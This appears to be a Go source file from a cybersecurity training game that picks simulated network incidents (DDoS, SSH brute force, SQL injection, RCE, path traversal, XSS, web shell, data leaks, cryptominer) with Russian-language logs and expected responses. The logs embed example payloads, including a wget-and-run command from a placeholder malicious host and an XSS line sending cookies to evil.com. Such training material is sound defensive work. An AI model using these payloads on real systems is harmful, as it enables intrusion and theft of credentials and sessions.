package repository

import (
	"cyber-skeleton/internal/domain"
	"math/rand"
	"time"
)

type NetworkIncidentGenerator struct {
	rand *rand.Rand
}

func NewNetworkIncidentGenerator() *NetworkIncidentGenerator {
	return &NetworkIncidentGenerator{
		rand: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

func (g *NetworkIncidentGenerator) GenerateMany(count int) []domain.NetworkIncident {
	if count <= 0 {
		count = 15
	}

	incidents := []domain.NetworkIncident{}
	allIncidents := []domain.NetworkIncident{
		{
			Type: "ddos_volumetric",
			Logs: []string{
				"[ALERT] Входящий трафик: 15 Гбит/с (норма: 2 Гбит/с)",
				"[ALERT] 50 000+ запросов/сек от 10 000+ уникальных IP‑адресов",
				"[ERROR] Время ответа веб‑сервера: 8500 мс (норма: 120 мс)",
				"[WARN] Обнаружена DDoS‑атака с усилением через DNS",
				"[INFO] Векторы атаки: UDP‑флуд, DNS‑рефлексия",
				"[CRITICAL] Доступность сервиса: 12%",
			},
			Action: "block",
		},
		{
			Type: "ddos_application",
			Logs: []string{
				"[ALERT] HTTP‑запросов: 100 000/сек (норма: 500/сек)",
				"[WARN] Обнаружены Slowloris‑похожие частичные HTTP‑запросы",
				"[ERROR] Потоки приложения заняты: 2000/2000",
				"[INFO] Повторяющийся User‑Agent: Mozilla/5.0 (подозрительный шаблон)",
				"[CRITICAL] Соединения с БД: 1000/1000 (предел)",
				"[ERROR] Использование памяти: 98%",
			},
			Action: "block",
		},
		{
			Type: "ddos_syn_flood",
			Logs: []string{
				"[ALERT] SYN‑пакетов: 500 000/сек",
				"[WARN] Полуоткрытых TCP‑соединений: 65 000 (норма: 50)",
				"[ERROR] Очередь TCP backlog переполнена",
				"[INFO] IP‑адреса источников подделаны (spoofed)",
				"[CRITICAL] Новые подключения отклоняются",
				"[ALERT] Резкий рост таймаутов SYN‑ACK",
			},
			Action: "block",
		},
		{
			Type: "ddos_ntp_amplification",
			Logs: []string{
				"[ALERT] Ответный NTP‑трафик: 20 Гбит/с",
				"[WARN] Эксплуатируется команда monlist в NTP",
				"[INFO] Коэффициент усиления: 556x",
				"[ERROR] Легитимные NTP‑серверы используются как отражатели",
				"[CRITICAL] Занятость канала: 95%",
				"[ALERT] Более 200 NTP‑серверов шлют трафик на наш IP",
			},
			Action: "block",
		},
		{
			Type: "intrusion_ssh_bruteforce",
			Logs: []string{
				"[ALERT] Неудачных попыток SSH‑входа: 15 847 за 10 минут",
				"[WARN] Источник: 185.220.101.52 (Tor exit node)",
				"[INFO] Целевые пользователи: root, admin, ubuntu",
				"[WARN] Используется словарь rockyou.txt (узор по паролям)",
				"[ALERT] Скорость подбора: 26 попыток/сек",
				"[INFO] Порт назначения: 22 (SSH)",
			},
			Action: "block",
		},
		{
			Type: "intrusion_sqli",
			Logs: []string{
				"[ALERT] Обнаружена попытка SQL‑инъекции",
				"[WARN] Пэйлоад: ' OR '1'='1' --",
				"[INFO] Цель: /api/users?id=1' UNION SELECT NULL--",
				"[ERROR] WAF заблокировал 15 похожих запросов",
				"[CRITICAL] В ошибке БД светятся учётные данные",
				"[ALERT] IP атакующего: 45.142.212.87",
			},
			Action: "block",
		},
		{
			Type: "intrusion_rce",
			Logs: []string{
				"[CRITICAL] Попытка удалённого выполнения кода (RCE)",
				"[ALERT] Пэйлоад: ;wget http://malicious.com/shell.sh;bash shell.sh",
				"[WARN] Уязвимый endpoint: /api/upload",
				"[ERROR] Загружен файл: reverse_shell.php",
				"[CRITICAL] Исходящее соединение к 192.0.2.145:4444",
				"[ALERT] На сервере уже выполнялись оболочечные команды",
			},
			Action: "isolate",
		},
		{
			Type: "intrusion_path_traversal",
			Logs: []string{
				"[ALERT] Обнаружена атака Path Traversal",
				"[WARN] Запрос: /download?file=../../../../etc/passwd",
				"[INFO] Попытки доступа к: /etc/shadow, /root/.ssh/id_rsa",
				"[ERROR] 23 попытки чтения чувствительных файлов",
				"[WARN] IP атакующего: 203.0.113.58",
				"[INFO] Сработало правило WAF: защита LFI/RFI",
			},
			Action: "block",
		},
		{
			Type: "intrusion_xss",
			Logs: []string{
				"[ALERT] Обнаружена попытка XSS (Cross‑Site Scripting)",
				"[WARN] Пэйлоад: <script>document.location='http://evil.com/steal?c='+document.cookie</script>",
				"[INFO] Целевой URL: /profile?user=1",
				"[WARN] Параметр 'comment' не фильтруется",
				"[CRITICAL] Возможна кража cookies сессии пользователей",
				"[INFO] Пользователь‑жертва: id=542",
			},
			Action: "block",
		},
		{
			Type: "intrusion_web_shell",
			Logs: []string{
				"[ALERT] Подозрительный HTTP‑запрос к /uploads/shell.php",
				"[WARN] Обнаружен параметр cmd=whoami",
				"[CRITICAL] На сервере найден web‑shell: /var/www/html/uploads/shell.php",
				"[INFO] Запущена команда: id; uname -a; netstat -tulnp",
				"[WARN] В логах замечены команды для скачивания дополнительных скриптов",
				"[ALERT] IP источника: 198.51.100.25",
			},
			Action: "isolate",
		},
		{
			Type: "leak_s3_bucket",
			Logs: []string{
				"[ALERT] Публичный S3‑bucket обнаружен: company-backups-2024",
				"[CRITICAL] В бакете 15 000 файлов с персональными данными (PII)",
				"[WARN] Политика доступа: public-read",
				"[INFO] Время экспозиции: 48 часов",
				"[WARN] Найдены SQL‑дампы с клиентскими данными",
				"[ALERT] Доступ к бакету уже замечен с внешних IP",
			},
			Action: "isolate",
		},
		{
			Type: "leak_database_dump",
			Logs: []string{
				"[ALERT] Обнаружен незашифрованный дамп БД в открытой папке",
				"[WARN] Файл: /var/www/html/db_backup.sql",
				"[CRITICAL] В дампе содержатся хэши паролей и e‑mail‑адреса",
				"[INFO] Файл доступен по HTTP без авторизации",
				"[WARN] Логи nginx показывают несколько скачиваний файла",
				"[ALERT] Возможна полная компрометация базы пользователей",
			},
			Action: "isolate",
		},
		{
			Type: "misconfig_firewall_open",
			Logs: []string{
				"[ALERT] Порт 3306 (MySQL) доступен из интернета",
				"[WARN] Обнаружены внешние подключения к БД с неизвестных IP",
				"[INFO] Текущая политика firewall позволяет 0.0.0.0/0",
				"[CRITICAL] БД не требует TLS и пароли передаются в открытую",
				"[WARN] На порту 3389 (RDP) также открыт доступ из интернета",
				"[ALERT] Высокий риск прямого взлома БД и RDP‑службы",
			},
			Action: "patch",
		},
		{
			Type: "misconfig_default_credentials",
			Logs: []string{
				"[ALERT] Обнаружены учётные записи с дефолтными паролями",
				"[WARN] admin/admin на панели управления маршрутизатора",
				"[WARN] root/root на тестовом сервере",
				"[INFO] Логи показывают успешные входы с внешних IP",
				"[CRITICAL] Возможность полного захвата инфраструктуры",
				"[ALERT] Требуется немедленная смена всех дефолтных паролей",
			},
			Action: "patch",
		},
		{
			Type: "malware_cryptominer",
			Logs: []string{
				"[ALERT] Нестандартная нагрузка CPU на сервере: 98% более 6 часов",
				"[WARN] Процесс 'xmrig' запущен от пользователя nobody",
				"[INFO] Исходящие подключения к майнинг‑пулу: pool.minexmr.com:3333",
				"[CRITICAL] Сервер отвечает на запросы пользователей с большой задержкой",
				"[WARN] В cron найдена задача автозапуска майнера",
				"[ALERT] Классический индикатор криптомайнера на сервере",
			},
			Action: "isolate",
		},
		{
			Type: "false_positive_scanner",
			Logs: []string{
				"[ALERT] Обнаружено большое число соединений на разные порты",
				"[INFO] Источник: внутренний хост 10.0.0.15",
				"[INFO] Программа: security-scanner (сканер уязвимостей)",
				"[WARN] Поведение похоже на порт‑сканирование",
				"[INFO] В changelog указано плановое сканирование сети",
				"[CRITICAL] Реальной атаки нет, это легитимный скан безопасности",
			},
			Action: "ignore",
		},
	}

	if count >= len(allIncidents) {
		return allIncidents
	}

	perm := g.rand.Perm(len(allIncidents))
	for i := 0; i < count; i++ {
		incidents = append(incidents, allIncidents[perm[i]])
	}

	return incidents
}
